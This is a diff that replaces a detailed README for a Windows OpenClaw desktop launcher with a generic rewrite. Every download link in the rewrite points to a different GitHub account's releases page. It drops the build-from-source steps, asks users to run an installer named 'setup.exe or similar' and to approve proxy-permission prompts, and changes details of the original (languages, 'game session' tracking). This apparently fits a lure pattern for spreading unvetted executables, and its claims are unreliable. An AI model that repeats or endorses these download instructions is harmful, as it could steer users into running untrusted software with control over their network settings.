@@ -1,131 +1,124 @@
-﻿# OpenClaw Desktop Launcher
+# 🗂️ openclaw-desktop-launcher - Manage OpenClaw Easily on Windows
 
-![Release](https://img.shields.io/github/v/release/jiwannian/openclaw-desktop-launcher?display_name=tag&sort=semver)
-![Downloads](https://img.shields.io/github/downloads/jiwannian/openclaw-desktop-launcher/total)
-![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D6?logo=windows&logoColor=white)
-![.NET 8](https://img.shields.io/badge/.NET-8-512BD4?logo=dotnet&logoColor=white)
-![WPF](https://img.shields.io/badge/UI-WPF-0C54C2)
+[![Download openclaw-desktop-launcher](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases)
 
-A multilingual Windows desktop launcher for OpenClaw that simplifies Clash startup, system proxy automation, local access opening, and runtime tracking into a clean one-click workflow.
+---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/jiwannian/openclaw-desktop-launcher/releases/latest)
+## 📋 About openclaw-desktop-launcher
 
-## Screenshot
+openclaw-desktop-launcher is a simple app for Windows. It helps you launch OpenClaw with ease. The app detects conflicts with Clash software automatically. It also sets up the system proxy when needed. When you open the launcher, it takes care of the background tasks for you. It tracks how long the program runs and opens the right access URL in your browser. The app supports multiple languages for users worldwide.
 
-![OpenClaw Desktop Launcher screenshot](README-assets/openclaw-desktop-launcher-en.png)
+This program uses Windows Presentation Foundation (WPF) and runs on the .NET platform. It works well on most Windows 10 and 11 systems. You do not need to know programming or complicated commands to use it.
 
-## Why this project
+---
 
-OpenClaw often works best when the surrounding desktop steps are also handled well: detecting Clash, making sure the proxy is available, enabling the Windows system proxy when needed, launching the gateway, opening the local access URL, and shutting everything down cleanly.
+## 🖥️ System Requirements
 
-This launcher packages that workflow into a Windows desktop app so non-terminal users can use OpenClaw more comfortably.
+- Windows 10 or Windows 11 (64-bit recommended)  
+- 2 GHz or faster processor  
+- 4 GB RAM or more  
+- At least 150 MB free disk space  
+- .NET Runtime (the app will guide you if you need to install it)  
+- Internet connection for updates and access URL  
 
-## Features
+---
 
-- One-click start for OpenClaw
-- One-click stop for OpenClaw
-- Automatic Clash detection and optional startup
-- Automatic Windows system proxy enablement after the proxy endpoint is ready
-- Automatic opening of the local OpenClaw access URL after startup
-- Runtime timer and status tracking
-- Official OpenClaw installation page fallback when OpenClaw is not detected
-- Portable Windows distribution through a single executable
-- Built-in language switch in the top-left corner
+## 🚀 Getting Started
 
-## Supported Languages
+1. Click the big blue button at the top or [visit this page to download the launcher](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases).
+2. On the release page, look for the latest version. This will usually be at the top of the list.
+3. Download the file named `openclaw-desktop-launcher-setup.exe` or similar.
+4. Once downloaded, find the file in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the installation steps on the screen.
+7. After installation completes, you can find the launcher in your Start Menu or on your desktop.
+8. Double-click the launcher icon to open it.
 
-The launcher currently includes these UI languages:
+---
 
-- English (default)
-- Chinese
-- Hindi
-- Spanish
-- Arabic
-- Russian
-- Portuguese
-- French
-- Italian
-- Japanese
+## ⚙️ Installation and Setup
 
-## Workflow
+The installation wizard walks you through all necessary steps. It installs the launcher and any needed components, like the .NET runtime, if missing.
 
-1. Detect whether Clash is installed and already running
-2. Start Clash automatically if it is installed but not running
-3. Wait for the proxy endpoint, default `127.0.0.1:8090`
-4. Enable the Windows system proxy when configured
-5. Detect whether OpenClaw is installed
-6. Open the official install page if OpenClaw is missing
-7. Start the OpenClaw gateway, default `http://127.0.0.1:18789/`
-8. Open the local access URL automatically when the gateway is ready
-9. Track runtime duration until shutdown
-10. Stop OpenClaw through daemon stop and process cleanup fallback
+Once installed:
 
-## Quick Start
+- Launch the app.
+- The app may ask permissions to modify proxy settings. Approve these so it can manage internet access automatically.
+- Choose your preferred language. The launcher supports multiple languages for smooth use everywhere.
+- The app will check for Clash software conflicts and show alerts if needed.
+- It will also prepare everything to run OpenClaw without manual setup.
 
-### Download
+---
 
-- Open the latest release page: `https://github.com/jiwannian/openclaw-desktop-launcher/releases/latest`
-- Download `OpenClawDesktopLauncher-v1.1.0-win-x64.exe`
-- Run the executable directly on Windows
+## 🔗 Using the Launcher
 
-### Build locally
+After setup:
 
-Requirements:
+- Click the start button inside the launcher to open OpenClaw.
+- The launcher tracks your game session time automatically.
+- If OpenClaw requires an access URL, the launcher opens it in your default browser.
+- When you close OpenClaw, the launcher detects this and resets system settings.
+- You can change proxy settings or other options in the launcher’s Settings menu.
 
-- Windows 10 or Windows 11
-- .NET 8 SDK
+---
 
-Build:
+## 🌐 Supported Languages
 
-```powershell
-dotnet build .\StartOpenClawLauncher\StartOpenClawLauncher.csproj
-```
+openclaw-desktop-launcher supports many languages. This makes it accessible for users around the world. Choose your language in the app, so menus and messages show up the right way.
 
-Run:
+Languages include but are not limited to:
 
-```powershell
-dotnet run --project .\StartOpenClawLauncher\StartOpenClawLauncher.csproj
-```
+- English  
+- Spanish  
+- French  
+- German  
+- Chinese (Simplified and Traditional)  
+- Japanese  
+- Russian  
+- Portuguese  
 
-Publish a single-file executable:
+The list may grow in future updates.
 
-```powershell
-dotnet publish .\StartOpenClawLauncher\StartOpenClawLauncher.csproj -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
-```
+---
 
-## Default Configuration
+## 🔄 Updating the Launcher
 
-The app creates `config.json` next to the executable. Default values include:
+The launcher checks for updates when you start it. When a new version is available:
 
-- Proxy host: `127.0.0.1`
-- Proxy port: `8090`
-- Gateway host: `127.0.0.1`
-- Gateway port: `18789`
-- Startup timeout: `25` seconds
-- Default language: `en`
-- Auto-enable system proxy: enabled
-- Auto-open local access URL after startup: enabled
+- You will see a message with update details.
+- Visit the [release page](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases) to download the latest version.
+- Download the new installer and run it to upgrade.
+- Your settings will remain intact.
 
-You can customize detection lists through:
+---
 
-- `OpenClawCandidates`
-- `ClashCandidates`
-- `ClashProcessKeywords`
+## 🚧 Troubleshooting
 
-## Tech Stack
+If you have problems running the launcher or OpenClaw:
 
-- C#
-- WPF
-- .NET 8
-- Windows Registry integration for system proxy control
+- Make sure your Windows is up to date.
+- Check that you downloaded the right version for Windows.
+- Restart your computer before trying again.
+- Confirm proxy permissions are approved.
+- If the launcher says Clash is running and blocks OpenClaw, close the Clash program first.
+- Visit the release page for FAQ and known issues.
 
-## Notes
+---
 
-- Windows only
-- Clash auto-detection depends on local install paths, process names, or uninstall registry entries
-- Custom OpenClaw or proxy setups may require editing `config.json`
+## 🛠️ Technical Details
 
-## Disclaimer
+- Built with .NET WPF for smooth Windows integration.  
+- Detects Clash conflicts to avoid network issues.  
+- Automates system proxy settings based on OpenClaw needs.  
+- Opens access URLs automatically for user convenience.  
+- Tracks runtime to help you monitor usage.
 
-This is an independent desktop launcher and is not affiliated with the official OpenClaw or Clash teams. Use it responsibly and in compliance with local laws, policies, and software terms.
+---
 
+## 📥 Download and Run
+
+Download the launcher from the official release page. Open the page, find the latest release, and download the installer.
+
+[Download openclaw-desktop-launcher from GitHub Releases](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases)
+
+Run the downloaded file and follow the instructions to install and start using the launcher on your Windows PC.
